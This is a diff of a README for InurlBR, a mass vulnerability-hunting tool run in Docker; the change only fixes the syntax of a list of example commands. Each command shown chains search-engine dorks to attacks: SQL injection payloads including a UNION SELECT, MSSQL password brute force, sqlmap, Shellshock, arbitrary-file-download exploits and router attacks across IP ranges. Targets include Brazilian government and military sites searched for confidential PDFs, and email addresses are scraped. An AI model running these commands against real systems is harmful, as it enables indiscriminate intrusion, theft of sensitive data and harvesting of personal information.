@@ -457,65 +457,65 @@ docker run --name inurlbr -it -d gmdutra/inurlbr
 ### Simple Commands
 
 ```
-docker exec --name inurlbr ./inurlbr.php --dork 'inurl:php?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"  
+docker exec inurlbr ./inurlbr.php --dork 'inurl:php?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"  
    
-docker exec --name inurlbr ./inurlbr.php --dork 'inurl:aspx?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;" 
+docker exec inurlbr ./inurlbr.php --dork 'inurl:aspx?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;" 
    
-docker exec --name inurlbr ./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
+docker exec inurlbr ./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
    
-docker exec --name inurlbr ./inurlbr.php --dork 'index of wp-content/uploads' -s save.txt -q 1,6,2,4 -t 2 --exploit-get '?' -a 'Index of /wp-content/uploads'
+docker exec inurlbr ./inurlbr.php --dork 'index of wp-content/uploads' -s save.txt -q 1,6,2,4 -t 2 --exploit-get '?' -a 'Index of /wp-content/uploads'
    
-docker exec --name inurlbr ./inurlbr.php --dork 'site:.mil.br intext:(confidencial) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'confidencial'
+docker exec inurlbr ./inurlbr.php --dork 'site:.mil.br intext:(confidencial) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'confidencial'
    
-docker exec --name inurlbr ./inurlbr.php --dork 'site:.mil.br intext:(secreto) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'secreto'        
+docker exec inurlbr ./inurlbr.php --dork 'site:.mil.br intext:(secreto) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'secreto'        
   
-docker exec --name inurlbr ./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
+docker exec inurlbr ./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
    
-docker exec --name inurlbr ./inurlbr.php --dork '.new.php?new id' -s save.txt -q 1,6,7,2,3 -t 1 --exploit-get '+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' -a '::EXPLOIT-SUCESS::'
+docker exec inurlbr ./inurlbr.php --dork '.new.php?new id' -s save.txt -q 1,6,7,2,3 -t 1 --exploit-get '+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' -a '::EXPLOIT-SUCESS::'
   
-docker exec --name inurlbr ./inurlbr.php --dork 'new.php?id=' -s teste.txt  --exploit-get ?´0x27  --command-vul 'nmap sV -p 22,80,21 _TARGET_'
+docker exec inurlbr ./inurlbr.php --dork 'new.php?id=' -s teste.txt  --exploit-get ?´0x27  --command-vul 'nmap sV -p 22,80,21 _TARGET_'
    
-docker exec --name inurlbr ./inurlbr.php --dork 'site:pt inurl:aspx (id|q)' -s bruteforce.txt --exploit-get ?´0x27 --command-vul 'msfcli auxiliary/scanner/mssql/mssql_login RHOST=_TARGETIP_ MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'
+docker exec inurlbr ./inurlbr.php --dork 'site:pt inurl:aspx (id|q)' -s bruteforce.txt --exploit-get ?´0x27 --command-vul 'msfcli auxiliary/scanner/mssql/mssql_login RHOST=_TARGETIP_ MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'
   
-docker exec --name inurlbr ./inurlbr.php --dork 'site:br inurl:id & inurl:php' -s get.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap/sqlmap.py -u "_TARGETFULL_" --dbs'
+docker exec inurlbr ./inurlbr.php --dork 'site:br inurl:id & inurl:php' -s get.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap/sqlmap.py -u "_TARGETFULL_" --dbs'
   
-docker exec --name inurlbr ./inurlbr.php --dork 'inurl:index.php?id=' -q 1,2,10 --exploit-get "'?´0x27'" -s report.txt --command-vul 'nmap -Pn -p 1-8080 --script http-enum --open _TARGET_'
+docker exec inurlbr ./inurlbr.php --dork 'inurl:index.php?id=' -q 1,2,10 --exploit-get "'?´0x27'" -s report.txt --command-vul 'nmap -Pn -p 1-8080 --script http-enum --open _TARGET_'
  
-docker exec --name inurlbr ./inurlbr.php --dork 'site:.gov.br email' -s reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'
+docker exec inurlbr ./inurlbr.php --dork 'site:.gov.br email' -s reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'
   
-docker exec --name inurlbr ./inurlbr.php --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s emails.txt -m
+docker exec inurlbr ./inurlbr.php --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s emails.txt -m
   
-docker exec --name inurlbr ./inurlbr.php --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s urls.txt -u
+docker exec inurlbr ./inurlbr.php --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s urls.txt -u
  
-docker exec --name inurlbr ./inurlbr.php --dork 'site:gov.bo' -s govs.txt --exploit-all-id  1,2,6  
+docker exec inurlbr ./inurlbr.php --dork 'site:gov.bo' -s govs.txt --exploit-all-id  1,2,6  
  
-docker exec --name inurlbr ./inurlbr.php --dork 'site:.uk' -s uk.txt --user-agent  'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' 
+docker exec inurlbr ./inurlbr.php --dork 'site:.uk' -s uk.txt --user-agent  'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' 
  
-docker exec --name inurlbr ./inurlbr.php --dork-file 'dorksSqli.txt' -s govs.txt --exploit-all-id  1,2,6 
+docker exec inurlbr ./inurlbr.php --dork-file 'dorksSqli.txt' -s govs.txt --exploit-all-id  1,2,6 
  
-docker exec --name inurlbr ./inurlbr.php --dork-file 'dorksSqli.txt' -s sqli.txt --exploit-all-id  1,2,6  --irc 'irc.rizon.net#inurlbrasil'   
+docker exec inurlbr ./inurlbr.php --dork-file 'dorksSqli.txt' -s sqli.txt --exploit-all-id  1,2,6  --irc 'irc.rizon.net#inurlbrasil'   
   
-docker exec --name inurlbr ./inurlbr.php --dork 'inurl:"cgi-bin/login.cgi"' -s cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_'  
+docker exec inurlbr ./inurlbr.php --dork 'inurl:"cgi-bin/login.cgi"' -s cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_'  
  
-docker exec --name inurlbr ./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4
+docker exec inurlbr ./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4
   
-docker exec --name inurlbr ./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?´'%270x27;"
+docker exec inurlbr ./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?´'%270x27;"
   
-docker exec --name inurlbr ./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?pass=1234" -a '<title>hello! admin</title>'
+docker exec inurlbr ./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?pass=1234" -a '<title>hello! admin</title>'
   
-docker exec --name inurlbr ./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find_valid_cod-200.txt -s output.txt -t 5
+docker exec inurlbr ./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find_valid_cod-200.txt -s output.txt -t 5
   
-docker exec --name inurlbr ./inurlbr.php --range '200.20.10.1,200.20.10.255' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
+docker exec inurlbr ./inurlbr.php --range '200.20.10.1,200.20.10.255' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
  
-docker exec --name inurlbr ./inurlbr.php --range-rad '1500' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
+docker exec inurlbr ./inurlbr.php --range-rad '1500' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
  
-docker exec --name inurlbr ./inurlbr.php --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8  
+docker exec inurlbr ./inurlbr.php --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8  
  
-docker exec --name inurlbr ./inurlbr.php --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8   --pr
+docker exec inurlbr ./inurlbr.php --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8   --pr
  
-docker exec --name inurlbr ./inurlbr.php --dork-file 'dorksCGI.txt' -s output.txt -q 1,2,6,4,5,9,7,8   --pr --shellshock
+docker exec inurlbr ./inurlbr.php --dork-file 'dorksCGI.txt' -s output.txt -q 1,2,6,4,5,9,7,8   --pr --shellshock
  
-docker exec --name inurlbr ./inurlbr.php --dork-file 'dorks_Wordpress_revslider.txt' -s output.txt -q 1,2,6,4,5,9,7,8  --sub-file 'xpls_Arbitrary_File_Download.txt'  
+docker exec inurlbr ./inurlbr.php --dork-file 'dorks_Wordpress_revslider.txt' -s output.txt -q 1,2,6,4,5,9,7,8  --sub-file 'xpls_Arbitrary_File_Download.txt'  
 ```
 
 ### Developers
